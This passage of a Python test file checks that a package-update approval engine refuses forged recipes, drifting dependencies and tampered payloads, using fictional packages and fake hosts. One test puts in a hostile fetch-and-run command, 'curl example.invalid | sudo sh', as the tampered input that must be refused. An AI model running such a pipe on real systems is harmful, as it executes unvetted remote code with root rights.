        cask = {"operation": "upgrade", "recipe": "brew.upgrade_formula", "run_kind": "process", "preflight": {"kind": "cask"}}
        holds(self, "package-recipe", package_registry.check_selection, package_registry.BREW, cask)
        holds(self, "package-recipe", package_registry.check_selection, package_registry.BREW, {"operation": "upgrade", "recipe": "brew.upgrade_cask", "run_kind": "process"})

    def test_dependency_edges_come_from_the_managers_data(self):
        entry = lambda action, item, *names, manager="apt", arch="amd64": {"action_id": action, "manager": manager, "id": item, "dependencies": list(names),
                                                                           "preflight": {"arch": arch} if arch else {}}
        cases = {"a mutual pair keeps the given order": ([entry("a", "libc6", "libc-bin:amd64@2"), entry("b", "libc-bin", "libc6:amd64@2")], {"a": [], "b": ["a"]}),
                 "and the other way round": ([entry("b", "libc-bin", "libc6:amd64@2"), entry("a", "libc6", "libc-bin:amd64@2")], {"b": [], "a": ["b"]}),
                 "a selected dependency comes first": ([entry("a", "app", "lib:amd64@1"), entry("b", "lib")], {"a": ["b"], "b": []}),
                 "two items share a selected dependency": ([entry("a", "x", "c:amd64@1"), entry("b", "y", "c:amd64@1"), entry("c", "c")], {"a": ["c"], "b": ["c"], "c": []}),
                 "a dependency nobody selected is no edge": ([entry("a", "x", "z:amd64@1"), entry("b", "y", "z:amd64@1")], {"a": [], "b": []}),
                 "another architecture is another package": ([entry("a", "x", "y:i386@1"), entry("b", "y")], {"a": [], "b": []}),
                 "a foreign item by its architecture": ([entry("a", "x", "y:i386@1"), entry("b", "y:i386", arch="i386")], {"a": ["b"], "b": []}),
                 "another manager is another package": ([entry("a", "x", "y@1", manager="brew", arch=None), entry("b", "y", manager="pip", arch=None)], {"a": [], "b": []}),
                 "a name may hold @": ([entry("a", "x", "python@3.12@3.12.4", manager="brew", arch=None), entry("b", "python@3.12", manager="brew", arch=None)], {"a": ["b"], "b": []}),
                 "an item never needs itself": ([entry("a", "x", "x:amd64@1")], {"a": []}),
                 "a ring of three breaks at the first": ([entry("a", "x", "y:amd64@1"), entry("b", "y", "z:amd64@1"), entry("c", "z", "x:amd64@1")], {"a": [], "b": ["c"], "c": ["a"]})}
        for name, (entries, expected) in cases.items():
            with self.subTest(case=name):
                edges = package_registry.dependency_edges(entries)
                self.assertEqual(edges, expected)
                package_registry.plan_order([{**row, "depends_on": edges[row["action_id"]]} for row in entries])  # never circular

    def test_homebrew_dependencies_may_shrink_and_never_grow(self):
        # Homebrew's preflight is the other group's: this drives it through the descriptor. Its dry run also lists what `brew upgrade`
        # changes unasked (a new dependent), and nothing else binds that list.
        route, probe = package_registry.BREW, FakeProbe(platform="darwin")
        outdated = {**json.loads(fixture("brew-outdated.json")), "casks": []}
        outdated["formulae"] = [row for row in outdated["formulae"] if row["name"] == "examplefetch"]
        def run(dry_run=fixture("brew-dry-run.txt"), listed=json.dumps(outdated).encode()):
            return ManagerRun({"brew.version": fixture("brew-version.txt"), "brew.outdated_one": listed, "brew.info_one": fixture("brew-info.json"), "brew.dry_run": dry_run})
        candidate = route["run"]["preflight"](probe, run(), {"id": "examplefetch", "kind": "formula"}, "upgrade")
        self.assertEqual(candidate["dependencies"], ["exampledep@3.3.1", "examplenew@2.0"])
        fragment = route["plan"](candidate, {"operation": "upgrade", "executable": {"kind": "brew", "path": BREW, "identity": {"real_path": BREW}}, "agreements": []})
        self.assertEqual(fragment["depends_on"], [])
        payload = package_registry.payload(fragment, environment=FAKE_ENV)
        self.assertIsNone(route["drift"](probe, run(), payload))
        self.assertIsNone(route["drift"](probe, run(fixture("brew-dry-run.txt").replace(b"exampledep     3.3.0    -> 3.3.1\n", b"")), payload), "an earlier item took it")
        for name, text in (("a new dependent", fixture("brew-dry-run.txt").replace(b"==> Would install", b"exampleextra   1.0      -> 1.1\n==> Would install")),
                           ("another version", fixture("brew-dry-run.txt").replace(b"-> 3.3.1", b"-> 3.3.2"))):
            with self.subTest(change=name):
                self.assertEqual(route["drift"](probe, run(text), payload)["hold"], "package-drift")
        held = route["drift"](probe, run(listed=b'{"formulae": [], "casks": []}'), payload)
        self.assertEqual((held["hold"], held["not_offered"]), ("brew-not-outdated", True))
        # No longer offered: the route's own read decides whether it stands at the approved target.
        info = json.loads(fixture("brew-info-after.json"))
        info["formulae"].append({"name": "examplenew", "full_name": "examplenew", "tap": "homebrew/core", "installed": [{"version": "2.0"}], "linked_keg": "2.0"})
        drift = lambda stdout: service_updates.UpdatesMixin._drift(route, probe, run(listed=b'{"formulae": [], "casks": []}'), payload,
                                                                   {"brew.info": {"ok": True, "exit_code": 0, "stdout": stdout}})
        self.assertIs(drift(json.dumps(info).encode()), True)
        for name, stdout in (("still at the old version", fixture("brew-info.json")), ("a planned package missing", fixture("brew-info-after.json"))):
            with self.subTest(read=name), self.assertRaises(ServiceRefusal) as caught:
                drift(stdout)
            self.assertEqual(caught.exception.code, "brew-not-outdated")


@refusals_fail
class RouteEngineTests(PackageEngineFixture):
    """The real routes, service and engine together, over a fictional computer."""

    def on_host(self, host, names):
        """The selected ``names`` of the real route of ``host``, prepared, planned and approved: (session id, plan hash, {name: action}), and the actions in plan order."""
        self.route = package_registry.DESCRIPTORS[host.manager]
        sid = self.session(job="security_updates", platform="linux")
        self.service.elevation_probe = lambda: False
        actions = self.service.prepare_package_action(sid, adapter_id=UPGRADE, items=[{"action_id": "update-" + name, "manager": host.manager, "id": name} for name in names],
                                                      probe=host.probe(), launcher=host.read, **PROSE)
        return sid, self.approved(sid, actions, self.registered_plan(sid, actions)), actions

    def run_on_host(self, host, sid, sha, action):
        return self.launched(self.route, self.ticket(sid, action, sha), host.child, host.probe(), host.read)

    def test_a_step_that_never_started_holds_no_independent_item_through_the_engine(self):
        route = fake_route(dependencies={"tool-b": ["tool-a@1.0.0"]})
        sid, actions = self.prepared(route, [{"action_id": "a", "manager": "pip", "id": "tool-a"}, {"action_id": "b", "manager": "pip", "id": "tool-b"},
                                             {"action_id": "c", "manager": "pip", "id": "tool-c"}])
        sha = self.approved(sid, actions, self.registered_plan(sid, actions))
        by_id = {action["action_id"]: action for action in actions}
        issued = self.ticket(sid, by_id["a"], sha)
        closed = self.reconciled(route, sid, issued)
        self.assertEqual((closed["outcome"], closed["receipt"]["result"], closed["receipt"]["category"], closed["receipt"]["verified_postcondition"]),
                         ("failed", "not_run", "did_not_update", False))
        state = self.state(sid)
        self.assertEqual((state["status"], [item for item in self.engine.pending_items(state) if item["kind"] == "reconciliation"]), ("active", []))
        self.assertEqual(state["evidence"][closed["evidence_id"]]["facts"]["result"], "not_run")
        with self.assertRaises((ServiceRefusal, WorkflowRefusal)):  # what needs it stays out
            self.ticket(sid, by_id["b"], sha)
        self.assertEqual(self.launched(route, self.ticket(sid, by_id["c"], sha))["outcome"], "succeeded")

    def test_an_upgrade_naming_the_repair_recipe_is_refused_through_the_engine(self):
        # A hash-consistent upgrade payload that names dpkg --configure -a: run, it would repair without the repair's acknowledgment.
        def preflight(probe, run, item, operation):
            return {"operation": operation, "id": item["id"], "version": "1.0-1", "source": "fictional", "dependencies": [], "preflight": {"item": item["id"]}}
        honest = MappingProxyType({**package_registry.APT, "run": MappingProxyType({**package_registry.APT["run"], "preflight": preflight})})
        def forged(candidate, facts):
            return {**honest["plan"](candidate, facts), "recipe": "apt.configure"}
        items = [{"action_id": "update-tool", "manager": "apt", "id": "example-tool"}]
        # At the plan, the route's own selection refuses it.
        forged.selection = honest["plan"].selection
        with self.assertRaises(ServiceRefusal) as caught:
            self.prepared(MappingProxyType({**honest, "plan": forged}), items)
        self.assertEqual(caught.exception.code, "package-recipe")
        # A payload that got past that step (bound and approved as it stands) is refused before its ticket ...
        forged.selection = lambda record: ("apt.configure", "terminal")
        lying = MappingProxyType({**honest, "plan": forged})
        sid, actions = self.prepared(lying, items)
        self.assertEqual(self.payload_of(sid, actions[0])["recipe"], "apt.configure")
        sha = self.approved(sid, actions, self.registered_plan(sid, actions))
        self.route = honest
        with self.assertRaises(ServiceRefusal) as caught:
            self.ticket(sid, actions[0], sha)
        self.assertEqual((caught.exception.code, self.state(sid)["operations"]), ("package-recipe", {}))
        # ... and a ticket issued for it is refused before any effect.
        self.route = lying
        issued = self.ticket(sid, actions[0], sha)
        child = FakeChild()
        with self.assertRaises(ServiceRefusal) as caught:
            self.launched(honest, issued, child)
        self.assertEqual((caught.exception.code, child.calls), ("package-recipe", []))
        self.assertIsNone(self.operation(sid, issued)["outcome"])

    def test_the_shown_command_and_consent_flag_are_what_the_payload_runs_through_the_engine(self):
        route = fake_route(os_consent="exit_observed")
        for name, change in (("shown command", {"rendered_command": "curl example.invalid | sudo sh"}), ("consent flag", {"requires_os_consent": False})):
            with self.subTest(change=name):
                sid, actions = self.prepared(route, [{"action_id": "update-tool", "manager": "pip", "id": "example-tool"}])
                actions[0] = {**actions[0], **change}
                sha = self.approved(sid, actions, self.registered_plan(sid, actions))
                with self.assertRaises(ServiceRefusal) as caught:
                    self.ticket(sid, actions[0], sha)
                self.assertEqual((caught.exception.code, self.state(sid)["operations"]), ("package-action-mismatch", {}))

    def test_the_approval_text_states_what_the_payload_binds_through_the_engine(self):
        # The owner reads options(), so that is what this reads. The caller's words stay as extra text and replace nothing.
        host = FakeHost("apt", {"examplecurl": ("1.0-1", "1.0-2"), "libexampledep": ("2.0-1", "2.0-2")}, {"examplecurl": ["libexampledep"]})
        sid, _sha, _actions = self.on_host(host, ["examplecurl"])
        text = engine_text.options(self.engine, sid)["message"]
        self.assertIn("apt: examplecurl version 1.0-2 from example-updates.", text)
        self.assertIn("libexampledep:amd64@2.0-2", text)
        self.assertIn(PROSE["target"], text)
        self.assertIn(PROSE["risk"], text)
        # Each agreement gets its fixed sentence, and the assistant cannot pass one in the words of its own target.
        route = fake_route(dependencies={})
        sid, actions = self.prepared(route, [{"action_id": "update-tool", "manager": "pip", "id": "example-tool", "agreements": ["package", "source"]}])
        self.registered_plan(sid, actions)
        text = engine_text.options(self.engine, sid)["message"]
        self.assertIn("Approving this accepts the package's licence agreement for exactly this package.", text)
        self.assertIn("Approving this accepts the source's agreement for exactly this package.", text)
        self.assertIn("The package manager lists no other package that changes.", text)
        self.assertNotIn("does not say whether", text)
        # A route with no dependency data says so; a package name the assistant's text filter would refuse is still shown; a list
        # past the engine's bound is cut, with its count, and the plan registers.
        sid, actions = self.prepared(fake_route(), [{"action_id": "update-tool", "manager": "pip", "id": "base-passwd"}])
        self.registered_plan(sid, actions)
        text = engine_text.options(self.engine, sid)["message"]
        self.assertIn("pip: base-passwd version 1.0.0 from fictional.", text)
        self.assertIn("The package manager does not say whether other packages change.", text)
        many = {"example-tool": [f"example-long-library-name-{number:03}@1.2.3-4example5" for number in range(300)]}
        sid, actions = self.prepared(fake_route(dependencies=many), [{"action_id": "update-tool", "manager": "pip", "id": "example-tool"}])
        self.registered_plan(sid, actions)
        self.assertEqual(len(actions[0]["risk"]), 2000)
        self.assertIn("It also changes 300 other package(s): example-long-library-name-000@", actions[0]["risk"])
        self.assertTrue(actions[0]["risk"].endswith("\u2026"))

    def test_a_practice_session_never_reaches_the_real_launcher_through_the_command_line(self):
        # The real entry with every default it uses: only the outermost fakes differ, so a missing refusal reaches the default launcher.
        route = fake_route()
        sid, issued = self.ticketed(route)
        output = io.StringIO()
        with mock.patch.object(patchcairn_service, "WorkflowEngine", lambda **keywords: self.engine), \
                mock.patch.object(patchcairn_service, "WorkflowService", lambda engine, **keywords: self.service), \
                mock.patch.object(readonly_runner, "HostProbe", RunProbe), mock.patch.object(readonly_runner, "_launch", FakeLauncher()), \
                mock.patch.object(service_updates, "_Console", FakeTerminal), mock.patch.object(service_updates, "_start_child", return_value=(0, b"")) as started, \
                registered(route), contextlib.redirect_stdout(output), contextlib.redirect_stderr(output):
            code = patchcairn_service.main(["run", "--ticket", issued["ticket_id"]])
        self.assertEqual((code, started.called), (2, False), output.getvalue())
        self.assertIsNone(self.operation(sid, issued)["outcome"])
        with registered(route), self.assertRaises(ServiceRefusal) as caught:
            self.service.run_ticket(ticket_id=issued["ticket_id"])
        self.assertEqual(caught.exception.code, "package-fixture-session")

    def test_a_refused_password_ran_nothing_through_the_engine(self):
        # Three wrong passwords: sudo exits 1, apt-get never does. Nothing ran, the read confirms it, so independent items carry on.
        route = fake_route(classify=package_registry.APT["classify_exit"], results={"tool-a": "did_not_update"}, os_consent="exit_observed", dependencies={})
        sid, actions = self.prepared(route, [{"action_id": "a", "manager": "pip", "id": "tool-a"}, {"action_id": "b", "manager": "pip", "id": "tool-b"}])
        sha = self.approved(sid, actions, self.registered_plan(sid, actions))
        first = self.launched(route, self.ticket(sid, actions[0], sha), FakeChild(code=1))
        receipt = first["receipt"]
        self.assertEqual((first["outcome"], receipt["result"], receipt["verified_postcondition"], receipt["exit"]["class"], receipt["os_consent"]),
                         ("failed", "did_not_update", True, "not_started", "not_observed"))
        self.assertEqual(self.state(sid)["status"], "active")
        self.assertEqual(self.launched(route, self.ticket(sid, actions[1], sha))["outcome"], "succeeded")

    def test_items_of_one_transaction_stay_their_own_actions_through_the_engine(self):
        # Each item is simulated alone, so libc6 and libc-bin each list the other. The first run brings both; the second ticket finds
        # its item no longer offered, because it stands at its approved target.
        for manager in ("apt", "dnf"):
            with self.subTest(manager=manager):
                host = FakeHost(manager, {"libc6": ("2.39-1", "2.39-2"), "libc-bin": ("2.39-1", "2.39-2")}, {"libc6": ["libc-bin"], "libc-bin": ["libc6"]})
                sid, sha, actions = self.on_host(host, ["libc6", "libc-bin"])
                self.assertEqual([action["action_id"] for action in actions], ["update-libc6", "update-libc-bin"])
                self.assertEqual(self.payload_of(sid, actions[1])["depends_on"], ["update-libc6"])
                self.assertEqual(self.payload_of(sid, actions[0])["depends_on"], [])
                first = self.run_on_host(host, sid, sha, actions[0])
                self.assertEqual((first["outcome"], first["receipt"]["adapter_invoked"], len(host.started)), ("succeeded", True, 1))
                second = self.run_on_host(host, sid, sha, actions[1])
                receipt = second["receipt"]
                self.assertEqual(len(host.started), 1, "nothing starts for an item already at its target")
                self.assertEqual((second["outcome"], receipt["result"], receipt["verified_postcondition"], receipt["adapter_invoked"], receipt["reason"]),
                                 ("succeeded", "updated", True, False, "already_at_target"))
                self.assertEqual(self.state(sid)["status"], "active")

    def test_items_sharing_a_dependency_run_in_turn_through_the_engine(self):
        offers = {"tool-a": ("1.0-1", "1.0-2"), "tool-b": ("1.0-1", "1.0-2"), "libshared": ("1.0-1", "1.0-2")}
        for manager in ("apt", "dnf"):
            with self.subTest(manager=manager, case="the dependency is selected too"):
                host = FakeHost(manager, offers, {"tool-a": ["libshared"], "tool-b": ["libshared"]})
                sid, sha, actions = self.on_host(host, ["tool-a", "tool-b", "libshared"])
                self.assertEqual([action["action_id"] for action in actions], ["update-libshared", "update-tool-a", "update-tool-b"])
                results = [self.run_on_host(host, sid, sha, action) for action in actions]
                self.assertEqual([(result["outcome"], result["receipt"]["result"], result["receipt"]["adapter_invoked"]) for result in results],
                                 [("succeeded", "updated", True)] * 3)
                self.assertEqual(len(host.started), 3)
            with self.subTest(manager=manager, case="the dependency is not selected"):
                host = FakeHost(manager, offers, {"tool-a": ["libshared"], "tool-b": ["libshared"]})
                sid, sha, actions = self.on_host(host, ["tool-a", "tool-b"])
                results = [self.run_on_host(host, sid, sha, action) for action in actions]
                self.assertEqual([(result["outcome"], result["receipt"]["result"]) for result in results], [("succeeded", "updated")] * 2)

    def test_a_repository_that_left_the_transaction_is_no_drift_through_the_engine(self):
        offers = {"tool-a": ("1.0-1", "1.0-2"), "tool-b": ("1.0-1", "1.0-2"), "libshared": (None, "1.0-1")}
        host = FakeHost("dnf", offers, {"tool-a": ["libshared"], "tool-b": ["libshared"]}, {"libshared": "fedora"})
        sid, sha, actions = self.on_host(host, ["tool-a", "tool-b"])
        self.assertEqual(self.payload_of(sid, actions[1])["preflight"]["gpgcheck"], {"fedora": True, "updates": True})
        self.assertEqual([self.run_on_host(host, sid, sha, action)["outcome"] for action in actions], ["succeeded", "succeeded"])

    def test_a_new_dependent_or_another_version_holds_through_the_engine(self):
        for manager in ("apt", "dnf"):
            for name, change in (("a new dependent", lambda host: host.brings.update({"tool-a": ["libshared", "libnew"]})),
                                 ("another version", lambda host: host.offers.update({"libshared": ("1.0-1", "1.0-3")})),
                                 ("another target", lambda host: host.offers.update({"tool-a": ("1.0-1", "1.0-3")}))):
                with self.subTest(manager=manager, change=name):
                    host = FakeHost(manager, {"tool-a": ("1.0-1", "1.0-2"), "libshared": ("1.0-1", "1.0-2"), "libnew": (None, "1.0-1")}, {"tool-a": ["libshared"]})
                    sid, sha, actions = self.on_host(host, ["tool-a"])
                    change(host)
                    issued = self.ticket(sid, actions[0], sha)
                    with self.assertRaises(ServiceRefusal) as caught:
                        self.launched(self.route, issued, host.child, host.probe(), host.read)
                    self.assertEqual((caught.exception.code, host.started), ("package-drift", []))
                    self.reconciled(self.route, sid, issued)  # the engine's registry is shared: the next case needs this step closed

    def test_an_item_gone_elsewhere_is_not_at_its_target_through_the_engine(self):
        # No longer offered and not at the approved target: that is a hold, not a success.
        host = FakeHost("apt", {"tool-a": ("1.0-1", "1.0-2")})
        sid, sha, actions = self.on_host(host, ["tool-a"])
        del host.offers["tool-a"]
        with self.assertRaises(ServiceRefusal) as caught:
            self.run_on_host(host, sid, sha, actions[0])
        self.assertEqual((caught.exception.code, host.started), ("apt-not-offered", []))

    def test_a_reboot_file_from_before_the_run_is_no_restart_of_this_step_through_the_engine(self):
        route = fake_route(restart_files=dict(package_registry.APT["run"]["restart_files"]))
        sid, issued = self.ticketed(route)
        result = self.launched(route, issued, probe=RunProbe(files={SUDO: regular(), "/run/reboot-required": regular()}))
        self.assertEqual((result["outcome"], result["receipt"]["already_pending"], self.operation(sid, issued).get("restart_pending")), ("succeeded", True, None))

    def test_a_practice_reconciliation_never_reads_this_computer_through_the_engine(self):
        # A practice run that stopped right after its child's exit was saved: the public reconciliation builds no real probe and no
        # reads, and runs no read, unless the test gives both fakes.
        route = fake_route(result="updated")
        sid, issued = self.ticketed(route)
        with mock.patch.object(self.service, "_complete", side_effect=KeyboardInterrupt), self.assertRaises(KeyboardInterrupt):
            self.launched(route, issued)
        self.assertTrue((self.service._operation_dir(sid, issued["operation_id"]) / service_updates.EXIT_RECORD).exists())
        with registered(route), mock.patch.object(readonly_runner, "HostProbe", side_effect=AssertionError("a probe of this computer was built")), \
                mock.patch.object(readonly_runner, "run_recipe", side_effect=AssertionError("a read ran")), \
                mock.patch.object(service_updates, "_Reads", side_effect=AssertionError("reads were built")):
            for fakes in ({}, {"probe": RunProbe()}, {"reader": FakeLauncher()}):
                with self.subTest(fakes=sorted(fakes)), self.assertRaises(ServiceRefusal) as caught:
                    self.service.reconcile_operation(sid, operation_id=issued["operation_id"], **fakes)
                self.assertEqual(caught.exception.code, "package-fixture-session")
        self.assertIsNone(self.operation(sid, issued)["outcome"])
        result = self.reconciled(route, sid, issued)  # with both fakes it settles from the saved exit
        self.assertEqual((result["outcome"], result["receipt"]["result"]), ("succeeded", "updated"))

    def test_a_ticket_command_is_found_again_from_its_operation_through_the_engine(self):
        route = fake_route(restart_probe="apt.needrestart", restart=lambda found: "required")
        sid, issued = self.ticketed(route)
        self.assertEqual(self.service.ticket_command(sid, operation_id=issued["operation_id"]), issued["command"])
        self.launched(route, issued)
        self.assertEqual(self.service.ticket_command(sid, operation_id=issued["operation_id"]), issued["command"], "the check after the restart")


@refusals_fail
class PolicyAdmissionTests(PackageEngineFixture):
    """A step begun under a standing policy whose ticket has not run yet: what the owner decides afterwards decides whether its
    effect starts, through the real engine and service. A current approval decides first; without one, only the policy that
    began the step does."""

    BINDING = ("adapter_id", "adapter_payload_sha256", "adapter_plan_sha256", "target_inventory_sha256")

    def policy(self, sid, actions):
        later = (datetime.now(timezone.utc) + timedelta(hours=1)).isoformat().replace("+00:00", "Z")
        self.engine.set_standing_policy(sid, action_kinds=["update"], targets=[action["target"] for action in actions], max_actions=2,
                                        expires_utc=later, action_bindings=[{key: action[key] for key in self.BINDING} for action in actions],
                                        owner_quote="Allow these exact fictional updates.", owner_message_id="fictional-policy-" + uuid.uuid4().hex)

    def policy_begun(self):
        """Two independent fictional updates under a policy, "update-a" begun with its ticket: (session id, {id: action}, plan hash, ticket)."""
        sid = self.session(job="security_updates", platform="linux")
        self.engine.setup(sid, control="automatic")
        self.engine.authorize_scope(sid, owner_quote="Use only this selected synthetic folder.", owner_message_id="fictional-scope-" + uuid.uuid4().hex)
        sid, actions = self.prepared(fake_route(dependencies={}), [{"action_id": "update-a", "manager": "pip", "id": "example-tool"},
                                                                   {"action_id": "update-b", "manager": "pip", "id": "example-other"}], sid=sid)
        sha = self.registered_plan(sid, actions)
        for reviewer, role in (("fixture-reviewer-data", "compatibility_data"), ("fixture-reviewer-security", "evidence_security")):
            review = {"schema": "patchcairn.review", "schema_version": 1, "plan_sha256": sha, "role": role, "verdict": "approved",
                      "reviewer_id": reviewer, "attestation": "coordinator-attested"}
            self.engine.record_review(sid, plan_sha256=sha, reviewer_id=reviewer, role=role, verdict="approved",
                                      evidence_ids=[self.evidence("review", {"reviewed": True}, sid=sid, content=pc_records.encoded(review))],
                                      notes="Independent synthetic review of this exact bounded plan")
        self.policy(sid, actions)
        self.engine.advance_stage(sid, evidence_ids=[])
        by_id = {action["action_id"]: action for action in actions}
        issued = self.ticket(sid, by_id["update-a"], sha)
        self.assertEqual(self.operation(sid, issued)["authorization"]["kind"], "standing_policy")
        return sid, by_id, sha, issued

    def not_admitted(self, sid, issued):
        child = FakeChild()
        with self.assertRaises(WorkflowRefusal) as caught:
            self.launched(self.route, issued, child)
        self.assertEqual((caught.exception.code, child.calls), ("effect-authority", []))
        operation = self.operation(sid, issued)
        self.assertIsNone(operation["outcome"])
        self.assertNotIn("admitted_utc", operation["authorization"])
        self.assertFalse((self.service._operation_dir(sid, issued["operation_id"]) / "entered.json").exists())

    def test_a_later_narrower_approval_refuses_a_policy_begun_ticket(self):
        sid, actions, sha, issued = self.policy_begun()
        self.engine.approve_plan(sid, plan_sha256=sha, action_ids=["update-b"], owner_quote="Apply only the other fictional update.",
                                 owner_message_id="fictional-narrower-" + uuid.uuid4().hex)
        self.not_admitted(sid, issued)

    def test_a_replacement_policy_refuses_a_policy_begun_ticket(self):
        sid, actions, sha, issued = self.policy_begun()
        self.policy(sid, [actions["update-b"]])  # unexpired, of this plan, and leaves the begun step out
        self.not_admitted(sid, issued)

    def test_the_policy_that_began_it_or_an_approval_naming_it_still_admits(self):
        for name in ("the same policy", "an approval naming it"):
            with self.subTest(authority=name):
                sid, actions, sha, issued = self.policy_begun()
                if name == "an approval naming it":
                    self.engine.approve_plan(sid, plan_sha256=sha, action_ids=["update-a", "update-b"], owner_quote="Apply both fictional updates.",
                                             owner_message_id="fictional-both-" + uuid.uuid4().hex)
                self.assertEqual(self.launched(self.route, issued)["outcome"], "succeeded")


class RemovalTests(unittest.TestCase):
    def test_reviewed_external_targets_are_gone_and_an_old_operation_stays_held(self):
        for name in ("_execute_system_reviewed_external", "_reconcile_system_reviewed_external", "prepare_external_action",
                     "record_external_preflight", "complete_external", "complete_external_after_restart", "_external_sources",
                     "_external_preflight", "_artifact", "_external_receipt", "_record_restart_pending", "_restart_boot"):
            self.assertFalse(hasattr(WorkflowService, name), name)
        # An operation stored under the retired id reconciles to exactly the held refusal, and nothing is read or finished.
        service = object.__new__(WorkflowService)
        service.elevation_probe = lambda: False
        service._lock = mock.Mock(side_effect=nullcontext)
        intent = {"action": {"adapter_id": "system.reviewed_external"}, "payload": {}}
        service.inspect_operation = mock.Mock(return_value={"operation": {"operation_id": OPERATION}, "intent": intent})
        with self.assertRaisesRegex(ServiceRefusal, "This step's outcome needs its own recorded evidence; nothing was changed"):
            service.reconcile_operation(SESSION, operation_id=OPERATION)


def tearDownModule():
    remove_fixture_roots()


if __name__ == "__main__":
    unittest.main()
